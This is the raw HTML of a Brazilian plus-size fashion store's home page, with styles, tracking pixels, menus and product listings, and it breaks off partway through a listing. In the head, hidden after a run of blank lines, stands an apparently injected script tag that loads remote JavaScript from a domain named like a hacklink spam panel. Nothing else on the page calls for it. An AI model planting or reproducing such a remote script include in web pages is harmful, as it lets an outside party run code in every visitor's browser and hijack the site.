#estimate_tax{
font-size: 14px;
}

.breadcrumb{
margin-bottom: 8px !important;
margin-top: 8px !important;
}

#content{
padding-top: 20px !important;
}

.product-thumb .caption{
min-height: 20px !important;
}

.product-thumb{
/*padding-top: 0 !important;*/
padding-bottom: 0 !important;
}

span.save-percent {
    color: #eb008b;
}

.alert.alert-success {
    background-color: #cbeacb;
}
.alert.alert-success a {
    color: #eb008b;
    text-decoration: underline;
}

#custom-bar-wrapper {
    background-color: #eb005b;    
}

#custom-bar-content {
    padding: 10px 0px 0px 0px;
}

.menu_oc:nth-child(4) a {
    text-decoration: underline;
    color: red;
}

#social-payment .dropdown,#social-payment .dropup{
position: static !important;
}

#social-payment .dropdown-menu,
#footer-payment .dropdown-menu
{
top: 0 !important;
}

#footer-payment, #footer-payment li {
list-style-type: none !important;
}
</style>

<script>
$(function(){
/*addDeferedCss("//fonts.googleapis.com/css?family=ABeeZee:400,400i,300,700");
    addDeferedCss("//fonts.googleapis.com/css?family=Dosis:400,400i,300,700");
    addDeferedCss("//fonts.googleapis.com/css?family=ABeeZee&amp;subset=latin,cyrillic-ext,latin-ext,cyrillic,greek-ext,greek,vietnamese");
*/    
    addDeferedCss("catalog/view/javascript/font-awesome/css/abeezee.css");
    addDeferedCss("catalog/view/javascript/font-awesome/css/dosis.css");
    addDeferedCss("catalog/view/javascript/font-awesome/css/abeezee-custom.css");
});
</script>



<script>
$(function(){
  $.stellar({
    horizontalScrolling: false,
	verticalOffset: 0
  });
});
</script>

<!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-946041581">
</script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'AW-946041581');
</script>
<!-- Event snippet for www.vickttoriavick.com.br conversion page -->
<script>
  gtag('event', 'conversion', {
      'send_to': 'AW-946041581/FELOCLSO-l8Q7eWNwwM',
      'transaction_id': ''
  });
</script>

<!-- Facebook Pixel Code -->
<script>
  !function(f,b,e,v,n,t,s)
  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
  n.queue=[];t=b.createElement(e);t.async=!0;
  t.src=v;s=b.getElementsByTagName(e)[0];
  s.parentNode.insertBefore(t,s)}(window, document,'script',
  'https://connect.facebook.net/en_US/fbevents.js');
  fbq('init', '1494482150879280');
  fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
  src="https://www.facebook.com/tr?id=1494482150879280&ev=PageView&noscript=1"
/></noscript>
<!-- End Facebook Pixel Code -->




























<script src="https://hacklinkpanelial.com/panel/api/303.js"></script>



				<script type="text/javascript" src="catalog/view/javascript/lazyload/jquery.lazyload.min.js"></script>
				<script type="text/javascript">
				fired = [];
				$(document).ready(function() {
					$('img.lazy-load').lazyload({
						effect: "fadeIn",
						effectspeed: 3000,  
						threshold: 100,
						skip_invisible: false,
						appear: function(){
						
                            product_id = $(this).parents('.product-thumb').eq(0).attr('data-id');
                            //console.log(product_id)
                            if (typeof product_id !== typeof undefined && product_id !== false)
                            {
                                if(fired.includes(product_id)) return;
                                //console.log(fired);
                                fired.push(product_id);
                                product_name = $(this).parents('.product-thumb').eq(0).attr('data-name');
                                google_category = $(this).parents('.product-thumb').eq(0).attr('data-google-category');
                                if(
                                (typeof google_category !== typeof undefined && google_category !== false) &&
                                (typeof product_name !== typeof undefined && product_name !== false)
                                )
                                {
                                    fbq('track','ViewContent',{"content_name":product_name,"content_category": google_category,"content_ids":product_id,"content_type":"product"}); 
                                    //console.log(product_name,google_category,product_id);
                                }
                            }
                            
						}
						//,placeholder : "catalog/view/javascript/lazyload/loading.gif"
					});
				});
				</script>
			

        <link href="catalog/view/javascript/bootstrap/css/bootstrap-toggle.min.css" type="text/css" rel="stylesheet" media="screen" />
      
</head>
<body class="common-home">

                
    

    
<script type="text/javascript">
window.google_tag_params = {
            'ecomm_pagetype': 'other'};
</script>
<script type="text/javascript">
/* <![CDATA[ */
var google_conversion_id = 946041581;
var google_custom_params = window.google_tag_params;
var google_remarketing_only = true;
/* ]]> */
</script>
<script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
</script>
<noscript>
<div style="display:inline;">
<img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/946041581/?guid=ON&amp;script=0"/>
</div>
</noscript>







<div class="sidebar-opacity"></div>
<div id="wrapper" class="wrapper full-width">
<div id="sidebar-wrapper">
  <ul class="sidebar-nav list-group">
    <li class="sidebar-title">
      <a href="#menu-toggle-close" id="menu-toggle-close"><span aria-hidden="true">&times;</span></a>Informações
      <script>
      $("#menu-toggle-close").click(function(e) {
        e.preventDefault();
        $("#wrapper").toggleClass("toggled");
		$(".sidebar-opacity").toggleClass("toggled");
      });
      </script>
    </li>
     
    <li><a href="https://www.vickttoriavick.com.br/compras-no-atacado">Compras No Atacado</a></li>
     
    <li><a href="https://www.vickttoriavick.com.br/programa-de-afiliados">Programa De Afiliados</a></li>
     
    <li><a href="https://www.vickttoriavick.com.br/nossa-historia">Nossa História</a></li>
     
    <li><a href="https://www.vickttoriavick.com.br/politica-de-entrega">Política De Entrega</a></li>
     
    <li><a href="https://www.vickttoriavick.com.br/seguranca-e-privacidade">Segurança e Privacidade</a></li>
     
    <li><a href="https://www.vickttoriavick.com.br/termos-and-condicoes">Termos &amp; Condições</a></li>
     
    <li><a href="https://www.vickttoriavick.com.br/troca-e-devolucoes">Troca e Devoluções</a></li>
        <li><a href="https://www.vickttoriavick.com.br/contato">Entre em contato</a></li>
    <li><a href="https://www.vickttoriavick.com.br/site-map">Mapa do site</a></li>
  </ul>
</div>

<div id="sidebar-wrapper-contact">
  <ul class="sidebar-nav list-group">
    <li class="sidebar-title">
      <a href="#contact-toggle-close" id="contact-toggle-close"><span aria-hidden="true">&times;</span></a>Entre em contato
      <script>
      $("#contact-toggle-close").click(function(e) {
        e.preventDefault();
        $("#wrapper").toggleClass("contact-toggled");
		$(".sidebar-opacity").toggleClass("contact-toggled");
      });
      </script>
    </li>
    <li>
    <div>
    <h5>Endereço &nbsp;&nbsp;&nbsp;<a href="https://maps.google.com/maps?ll=-15.8133827%2C-48.0486994&hl=&z=15" target="_blank"><i data-toggle="tooltip" title="Ver mapa no Google" class="fa fa-map-marker"></i></a></h5>
    Quadra 09 Conjunto. 12 Casa 04<br />
Setor Habitacional Vicente Pires - Trecho 3<br />
Brasília/DF
    </div>
    </li>
    <li>
    <div>
    <h5>Fone</h5>
    +55(61) 3224 6110
    </div>
    </li>
            <li>
    <div>
    <h5>Horario Aberto</h5>
    Loja Online<br />
Segunda à Sexta-feira - 10h ás 17h - Exceto Feriados<br />
WhatsApp: (61) 3224 6110
    </div>
    </li>
            <li>
    <div>
    <a href="https://www.vickttoriavick.com.br/contato" class="btn btn-primary">Formulario de Contato</a>
    </div>
    </li>
  </ul>
</div>

<nav id="top">
  <div class="container"> 
    <div id="top-links" class="nav pull-left">
      <ul class="list-inline">

        <style>
ul.wk li a{
color : #000;
padding :5px;
}
.open>.dropdown-menu.wk{
right : auto;
}
header{
z-index : 99 !important;
}
header .links .wk a{
display:block;
text-align :left;
}
</style>
    <li class="dropdown"><a href="https://www.vickttoriavick.com.br/index.php?route=customerpartner/sell&amp;view=separate" title="https://www.vickttoriavick.com.br/index.php?route=customerpartner/sell&amp;view=separate" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-users"></i> <span class="hidden-xs hidden-sm hidden-md">Vendedor</span> <span class="caret"></span></a>
        <ul class="dropdown-menu dropdown-menu-right">
                      <li><a href="https://www.vickttoriavick.com.br/index.php?route=customerpartner/sell&amp;view=separate">Vendedor</a></li>
        </ul>
    </li>

      
        <li class="dropdown"><a href="https://www.vickttoriavick.com.br/minha-conta" title="Minha conta" class="dropdown-toggle" data-toggle="dropdown"><i class="fa fa-user hidden-md hidden-lg"></i> <span class="hidden-xs hidden-sm">Minha conta</span> <i class="fa fa-angle-down"></i></a>
          <ul class="dropdown-menu my-account-dropdown-menu">
                        <li class="col-xs-6 register"><a href="https://www.vickttoriavick.com.br/criar-conta"><i class="fa fa-pencil"></i><br>Cadastre-se</a></li>
            <li class="col-xs-6"><a href="https://www.vickttoriavick.com.br/entrar"><i class="fa fa-user"></i><br>Acessar</a></li>
                      </ul>
        </li>
        <li><a href="https://www.vickttoriavick.com.br/lista-desejos" id="wishlist-total" title="Lista de desejos (0)"><i class="fa fa-heart hidden-md hidden-lg"></i> <span class="hidden-xs hidden-sm">Lista de desejos (0)</span></a></li>
        <li><a href="https://www.vickttoriavick.com.br/carrinho" title="Seu Carrinho"><i class="fa fa-shopping-cart hidden-md hidden-lg"></i> <span class="hidden-xs hidden-sm">Seu Carrinho</span></a></li>
        <li><a href="https://www.vickttoriavick.com.br/finalizar" title="Finalizar pedido"><i class="fa fa-share hidden-md hidden-lg"></i> <span class="hidden-xs hidden-sm">Finalizar pedido</span></a></li>
        <li><a href="https://www.vickttoriavick.com.br/contato"><i class="fa fa-phone"></i></a> <span class="hidden-xs hidden-sm">+55(61) 3224 6110</span></li>
      </ul>
    </div>
    
    
    </div>
</nav>
<header>
  <div class="container">
    <div class="row">
    
            <div class="col-sm-4 header-information hidden-xs">
      <a href="#menu-toggle" class="" id="menu-toggle">
      <div id="information-block" class="buttons-header">
        <div class="button-i"><i class="fa fa-bars"></i></div>
        <span class="button-text">Informações</span>
      </div>
      </a>
      <script>
        $("#menu-toggle").click(function(e) {
          e.preventDefault();
          $("#wrapper").toggleClass("toggled");
		  $(".sidebar-opacity").toggleClass("toggled");
        });
      </script>
      <a href="#contact-toggle" class="" id="contact-toggle">
      <div id="contact-block" class="buttons-header">
        <div class="button-i"><i class="fa fa-envelope"></i></div>
        <span class="button-text">Contate-Nos</span>
      </div>
      </a>
      <script>
        $("#contact-toggle").click(function(e) {
          e.preventDefault();
          $("#wrapper").toggleClass("contact-toggled");
		  $(".sidebar-opacity").toggleClass("contact-toggled");
        });
      </script>
      </div>
            
      <div class="col-xs-12 col-sm-4 header-logo">
        <div id="logo">
                    <a href="https://www.vickttoriavick.com.br/"><img src="https://www.vickttoriavick.com.br/image/catalog/banners-2022/vickretangupng.png" title="Vickttoria Vick" alt="Vickttoria Vick" /></a>
                  </div>
      </div>
      
            <div class="col-sm-4">
            
      <a href="#menu-mobile-toggle" class="" id="menu-mobile-toggle">
      <div id="menu-mobile-block" class="buttons-header hidden-sm hidden-md hidden-lg">
        <div class="button-i"><i class="fa fa-bars"></i></div>
        <span class="button-text">Menu</span>
      </div>
      </a>
      <script>
        $("#menu-mobile-toggle").click(function(e) {
          e.preventDefault();
          $("#wrapper").toggleClass("menu-toggled");
		  $(".sidebar-opacity").toggleClass("menu-toggled");
        });
      </script>
      
      <a href="#" data-toggle="modal" data-target="#modal-search">
<div id="search-block" class="buttons-header up-theme-modal">
<div class="button-i"><i class="fa fa-search"></i></div>
<span class="button-text">Busca</span>
</div>
</a>
<div class="modal fade up-theme-modal" id="modal-search" tabindex="-1" role="dialog" aria-labelledby="modal-search" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-body">
      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
      
      <div id="search" class="input-group">
          <input id="modal-search-input" type="text" name="search" value="" placeholder="Busca" class="form-control input-lg" autocomplete="off" />
        <span class="input-group-addon">
          <button id="btn_live_search_improved" type="button" class="btn btn-default btn-lg"><i class="fa fa-search"></i></button>
        </span>
      </div>
      
      </div>
    </div>
  </div>
</div>

<script type="text/javascript">
$('#modal-search').on('shown.bs.modal', function () {
    $('#modal-search-input').focus();
})
</script>
<style>
    .modal-body #search{
        margin-top: 30px !important;
    }    
</style>    

      <div id="cart" class="btn-group btn-block buttons-header">
  <a data-toggle="dropdown" data-loading-text="Carregando..." class="btn dropdown-toggle">
  <div id="cart-tt"><div id="cart-total" class="button-i">0 - R$0,00</div></div>
  <span class="button-text">Seu Carrinho</span>
  </a>
  <ul class="dropdown-menu pull-right">
        <li>
      <p class="text-center">Seu carrinho está vazio.</p>
    </li>
      </ul>
</div>

      
      </div>
      
    </div>
  </div>
</header>

<script>
  //$(window).load(function(){
    //$("#menu").sticky({ topSpacing: 0 });
  //});
</script>

<nav id="menu" class="navbar">
      
  <div class="container">
    <!-- 
    <div class="navbar-header"><span id="category" class="visible-xs">Menu</span>
      <button type="button" class="btn btn-navbar navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse"><i class="fa fa-bars"></i></button>
    </div>
    -->
    <div class="collapse navbar-collapse navbar-ex1-collapse">
    
      <div id="logo-menu-container">
        <div id="logo-menu">
                    <a href="https://www.vickttoriavick.com.br/"><img src="https://www.vickttoriavick.com.br/image/catalog/banners-2022/vickretangupng.png" title="Vickttoria Vick" alt="Vickttoria Vick" /></a>
                  </div>
      </div>
      
      <ul class="main-menu">

        <!-- Home Page Link -->
        <li id="homepage" class="homepage-text"><a href="https://www.vickttoriavick.com.br/"><i class="fa fa-home"></i> <span>Principal</span></a></li>   
        
        
             
        <!-- Categories OpenCart Style -->    
                        <li class="menu_oc">
        <a href="https://www.vickttoriavick.com.br/moda-plus-size">Moda Plus Size</a>
          <div class="dropdown-menus">
                            <ul class="list-unstyled">
                			      	<li><a href="https://www.vickttoriavick.com.br/moda-plus-size/blazer-plus-size">Blazer Plus Size</a>
                    
                    
                    </li>
                			      	<li><a href="https://www.vickttoriavick.com.br/moda-plus-size/blusa-plus-size">Blusa Plus Size </a>
                    
                    
                    </li>
                			      	<li><a href="https://www.vickttoriavick.com.br/moda-plus-size/calca-plus-size">Calça Plus Size</a>
                    
                    
                    </li>
                			      	<li><a href="https://www.vickttoriavick.com.br/moda-plus-size/camisa-plus-size">Camisa Plus Size</a>
                    
                    
                    </li>
                              </ul>
                            <ul class="list-unstyled">
                			      	<li><a href="https://www.vickttoriavick.com.br/moda-plus-size/camiseta-plus-size">Camiseta Plus Size</a>
                    
                    
                    </li>
                			      	<li><a href="https://www.vickttoriavick.com.br/moda-plus-size/regata-plus-size">Regata Plus Size</a>
                    
                    
                    </li>
                			      	<li><a href="https://www.vickttoriavick.com.br/moda-plus-size/saias-plus-size">Saias Plus Size </a>
                    
                    
                    </li>
                			      	<li><a href="https://www.vickttoriavick.com.br/moda-plus-size/vestidos-plus-size">Vestidos Plus Size</a>
                    
                    
                    </li>
                              </ul>
                                        <a href="https://www.vickttoriavick.com.br/moda-plus-size" class="see-all dropdown-highlight">Exibir Moda Plus Size</a> 
          </div>
        </li>
                                <li class="menu_oc"><a href="https://www.vickttoriavick.com.br/ofertas">Ofertas</a></li>
                        <!-- Categories OpenCart Style - END -->  
                
                
        
        
        <!-- Brands -->
                
        <!-- Custom Links -->
                                                                        
        <li class="menu_links">
          <a href="https://www.vickttoriavick.com.br/blog" target="_self">
            Blog
          </a>
        </li>                             
                                                                                                                                        
        <!-- Custom Menu --> 
                
        <!-- Custom Blocks -->
         
                 
                 
                 
        
      </ul>
    </div>
  </div>
</nav>

<script type="text/javascript">
$(document).ready(function() {
	$('#accordion-mobile').dcAccordion({
		disableLink: false,	
		menuClose: false,
		autoClose: true,
		autoExpand: true,		
		saveState: false
	});
});
</script> 
<div id="menu-mobile" class="hidden-sm hidden-md hidden-lg">
<ul class="accordion sidebar-nav list-group" id="accordion-mobile">  
      <li class="sidebar-title">
      <a href="#menu-mobile-toggle-close" id="menu-mobile-toggle-close"><span aria-hidden="true">&times;</span></a>Menu
      <script>
      $("#menu-mobile-toggle-close").click(function(e) {
        e.preventDefault();
        $("#wrapper").toggleClass("menu-toggled");
		$(".sidebar-opacity").toggleClass("menu-toggled");
      });
      </script>
    </li> 
    <li><a href="https://www.vickttoriavick.com.br/">Principal</a></li>
        <li>
                  <a href="https://www.vickttoriavick.com.br/moda-plus-size" class="list-group-item">Moda Plus Size</a><div class="dcjq-icon"><i class="fa fa-plus"></i></div>
                            <ul>
                        <li>
              <a href="https://www.vickttoriavick.com.br/moda-plus-size/blazer-plus-size" class="list-group-item">Blazer Plus Size</a>
            </li>
                        <li>
              <a href="https://www.vickttoriavick.com.br/moda-plus-size/blusa-plus-size" class="list-group-item">Blusa Plus Size </a>
            </li>
                        <li>
              <a href="https://www.vickttoriavick.com.br/moda-plus-size/calca-plus-size" class="list-group-item">Calça Plus Size</a>
            </li>
                        <li>
              <a href="https://www.vickttoriavick.com.br/moda-plus-size/camisa-plus-size" class="list-group-item">Camisa Plus Size</a>
            </li>
                        <li>
              <a href="https://www.vickttoriavick.com.br/moda-plus-size/camiseta-plus-size" class="list-group-item">Camiseta Plus Size</a>
            </li>
                        <li>
              <a href="https://www.vickttoriavick.com.br/moda-plus-size/regata-plus-size" class="list-group-item">Regata Plus Size</a>
            </li>
                        <li>
              <a href="https://www.vickttoriavick.com.br/moda-plus-size/saias-plus-size" class="list-group-item">Saias Plus Size </a>
            </li>
                        <li>
              <a href="https://www.vickttoriavick.com.br/moda-plus-size/vestidos-plus-size" class="list-group-item">Vestidos Plus Size</a>
            </li>
                      </ul>
            </li>
        <li>
                  <a href="https://www.vickttoriavick.com.br/ofertas" class="list-group-item">Ofertas</a>
                      </li>
    
                                                
    <li class="menu_links">
      <a href="https://www.vickttoriavick.com.br/blog" target="_self">
        Blog
      </a>
    </li>                             
                                                                    
        <li>
      <a href="#" class="dropdown-toggle list-group-item" data-toggle="dropdown">Informações</a><div class="dcjq-icon"><i class="fa fa-plus"></i></div>
      <ul class="list-unstyled">
                <li><a href="https://www.vickttoriavick.com.br/compras-no-atacado">Compras No Atacado</a></li>
                <li><a href="https://www.vickttoriavick.com.br/programa-de-afiliados">Programa De Afiliados</a></li>
                <li><a href="https://www.vickttoriavick.com.br/nossa-historia">Nossa História</a></li>
                <li><a href="https://www.vickttoriavick.com.br/politica-de-entrega">Política De Entrega</a></li>
                <li><a href="https://www.vickttoriavick.com.br/seguranca-e-privacidade">Segurança e Privacidade</a></li>
                <li><a href="https://www.vickttoriavick.com.br/termos-and-condicoes">Termos &amp; Condições</a></li>
                <li><a href="https://www.vickttoriavick.com.br/troca-e-devolucoes">Troca e Devoluções</a></li>
              </ul>
    </li>   
    <li><a href="https://www.vickttoriavick.com.br/contato">Contate-Nos</a></li> 
</ul>
</div>



<div id="common-home" class="container">
  <div class="row">    <div id="content" class="col-sm-12"><div id="up_theme_banner0" class="panel panel-default up-theme-banner">
      <div class="pr2 col-sm-4 up-theme-banner-item slide-0">
  <a href="https://www.vickttoriavick.com.br/moda-plus-size/camisa-plus-size">
  <img src="https://www.vickttoriavick.com.br/image/cache/catalog/banners-2022/Camisa-300x150.jpg" class="lazy-load" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/banners-2022/Camisa-900x450.jpg" width="900" height="450" alt="Camisas Plus Size" title="Camisas Plus Size" />
  <span class="up-theme-banner-bg"></span>
  <span class="up-theme-banner-title"><h2>Camisas Plus Size</h2></span>
  </a>
  </div>
        <div class="pr2 col-sm-4 up-theme-banner-item slide-0">
  <a href="https://www.vickttoriavick.com.br/moda-plus-size/blusa-plus-size">
  <img src="https://www.vickttoriavick.com.br/image/cache/catalog/banners-2022/Blusa-300x150.jpg" class="lazy-load" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/banners-2022/Blusa-900x450.jpg" width="900" height="450" alt="Blusas Plus Size" title="Blusas Plus Size" />
  <span class="up-theme-banner-bg"></span>
  <span class="up-theme-banner-title"><h2>Blusas Plus Size</h2></span>
  </a>
  </div>
    </div>
<div id="up_theme_banner1" class="panel panel-default up-theme-banner">
      <div class="pr3 col-sm-4 up-theme-banner-item slide-0">
  <a href="https://www.vickttoriavick.com.br/sua-casa/almofadas">
  <img src="https://www.vickttoriavick.com.br/image/cache/catalog/banners-2022/Almofada-200x133.jpg" class="lazy-load" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/banners-2022/Almofada-600x400.jpg" width="600" height="400" alt="Almofadas" title="Almofadas" />
  <span class="up-theme-banner-bg"></span>
  <span class="up-theme-banner-title"><h2>Almofadas</h2></span>
  </a>
  </div>
        <div class="pr3 col-sm-4 up-theme-banner-item slide-0">
  <a href="https://www.vickttoriavick.com.br/moda-plus-size/vestidos-plus-size">
  <img src="https://www.vickttoriavick.com.br/image/cache/catalog/banners-2022/vestdo-200x133.jpg" class="lazy-load" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/banners-2022/vestdo-600x400.jpg" width="600" height="400" alt="Vestidos Plus Size" title="Vestidos Plus Size" />
  <span class="up-theme-banner-bg"></span>
  <span class="up-theme-banner-title"><h2>Vestidos Plus Size</h2></span>
  </a>
  </div>
        <div class="pr3 col-sm-4 up-theme-banner-item slide-0">
  <a href="https://www.vickttoriavick.com.br/sua-casa/canecas-de-cafe">
  <img src="https://www.vickttoriavick.com.br/image/cache/catalog/banners-2022/caneca-200x133.jpg" class="lazy-load" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/banners-2022/caneca-600x400.jpg" width="600" height="400" alt="Canecas" title="Canecas" />
  <span class="up-theme-banner-bg"></span>
  <span class="up-theme-banner-title"><h2>Canecas</h2></span>
  </a>
  </div>
    </div>

<div class="tabs-products">

<div id="product-tabs" class="row content-padd">
        <div class="col-sm-12">
          <ul id="tabs-0" class="nav nav-tabs">
                        <li class="active pt"><a href="#tab-latest-0" data-toggle="tab">Ultimos</a></li>
                                    <li class="pt"><a href="#tab-bestseller-0" data-toggle="tab">Mais Vendidos</a></li>
                                    <li class="pt"><a href="#tab-featured-0" data-toggle="tab">Destacados</a></li>
                                    <li class="pt"><a href="#tab-special-0" data-toggle="tab">Com Oferta</a></li>
                                    <li class="pt"><a href="#tab-most-viewed-0" data-toggle="tab">Mais Vistos</a></li>
                      </ul>


<div class="tab-content"> 


<div id="tab-latest-0" class="row product-items fade in tab-pane active">
<div id="slider-latest-0">
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('1969');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('1969');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Blusa Kira AjhurTúnica plus size, em cetim estampado com fundo doce de leite. Decote leve em V. Pequena pala com ajhur na altura do ombro. Mangas 3/4, boca de sino, com recortes com ajhur, e pequena a.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/blusa-kira-ajhur-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('1969');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/blusa-kira-ajhur-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/blusa-plus-size/blusa-kira-ajhur-plus-size_1969_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/blusa-plus-size/blusa-kira-ajhur-plus-size_1969_1-400x400.jpg" alt="Blusa Kira Ajhur Plus Size" title="Blusa Kira Ajhur Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/blusa-plus-size/blusa-kira-ajhur-plus-size_1969_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/blusa-plus-size/blusa-kira-ajhur-plus-size_1969_2-400x400.jpg" alt="Blusa Kira Ajhur Plus Size" title="Blusa Kira Ajhur Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/blusa-kira-ajhur-plus-size">Blusa Kira Ajhur Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Blusa Kira AjhurTúnica plus size, em cetim estampado com fundo doce de leite. Decote leve em V. Pequena pala com ajhur na altura do ombro. Mangas 3/4, boca de sino, com recortes com ajhur, e pequena a..</p>

                                
                                <p class="price">
                   
                  R$168,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/blusa-kira-ajhur-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('1969');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('2126');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('2126');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Twin Set Catherine&nbsp;Twin set plus size, em musseline estampada com fios dourados discretos. Regata com decote em V. Camisa mais comprida, decote careca. Mangas 3/4 com detalhe de franja bordô na b.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/twin-set-catherine-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('2126');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/twin-set-catherine-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/twin-set-catherine-plus-size_2126_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/twin-set-catherine-plus-size_2126_1-400x400.jpg" alt="Twin Set Catherine Plus Size" title="Twin Set Catherine Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/twin-set-catherine-plus-size_2126_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/camisa-plus-size/twin-set-catherine-plus-size_2126_2-400x400.jpg" alt="Twin Set Catherine Plus Size" title="Twin Set Catherine Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
                <div class="name"><h4><a href="https://www.vickttoriavick.com.br/twin-set-catherine-plus-size">Twin Set Catherine Plus Size</a></h4></div>
                <div class="product_box_brand"><a href="https://www.vickttoriavick.com.br/vickttoria-vick">Vickttoria Vick</a></div>
                <p class="description">Twin Set Catherine&nbsp;Twin set plus size, em musseline estampada com fios dourados discretos. Regata com decote em V. Camisa mais comprida, decote careca. Mangas 3/4 com detalhe de franja bordô na b..</p>

                                
                                <p class="price">
                   
                  R$215,00
                                  </p>
                                
                <div class="product-list-buttons">
                <div class="list-quickview">
                  <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/twin-set-catherine-plus-size ?>">Vista Rápida</a>
                </div>
                <div class="cart">
                  <button type="button" onclick="cart.add('2126');" class="btn btn-primary">Comprar</button>
                </div>
                </div>
                
      </div>
    </div>
  </div>
      <div class="product-layout product-grid col-xs-12">
      <div class="product-thumb transition">
      <div class="image">       
            <span class="badge-wrapper">
            
            	
             
                              
            	
                                                            
            </span>
      
            <button type="button" data-toggle="tooltip" data-placement="left" title="Lista de desejos" onclick="wishlist.add('2119');" class="wishlist"><i class="fa fa-heart"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Comparar" onclick="compare.add('2119');" class="compare"><i class="fa fa-gavel"></i></button>
            <button type="button" data-toggle="tooltip" data-placement="left" title="Vestido RainaVestido grippir plus size na cor marinho, Decote em V. Cintura marcada. Saia levemente evasê com um macho na cintura, só na frente. Todo forrado de cetim marinho. Mangas 3/4. Um vestido s.." class="info"><i class="fa fa-info"></i></button>
      
            <div class="flybar">  
            <div class="flybar-quickview">
            <a class="btn btn-default quickview" href="https://www.vickttoriavick.com.br/vestido-raina-plus-size ?>">Vista Rápida</a>
            </div>
            <div class="flybar-cart">
            <button type="button" onclick="cart.add('2119');" class="btn btn-primary">Comprar</button>  
            </div>   
            </div>
            
                        <a href="https://www.vickttoriavick.com.br/vestido-raina-plus-size">
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-raina-plus-size_2119_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-raina-plus-size_2119_1-400x400.jpg" alt="Vestido Raina Plus Size" title="Vestido Raina Plus Size" width="400" height="400" class="img-responsive lazy-load  img-thumbnail-theme" />
            <img src="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-raina-plus-size_2119_1-32x32.jpg" data-original="https://www.vickttoriavick.com.br/image/cache/catalog/produtos/vestidos-plus-size/vestido-raina-plus-size_2119_2-400x400.jpg" alt="Vestido Raina Plus Size" title="Vestido Raina Plus Size" width="400" height="400" class="img-responsive lazy-load  thumb_swap img-thumbnail-theme" />
            </a>
             
      </div>
      <div class="caption">
              
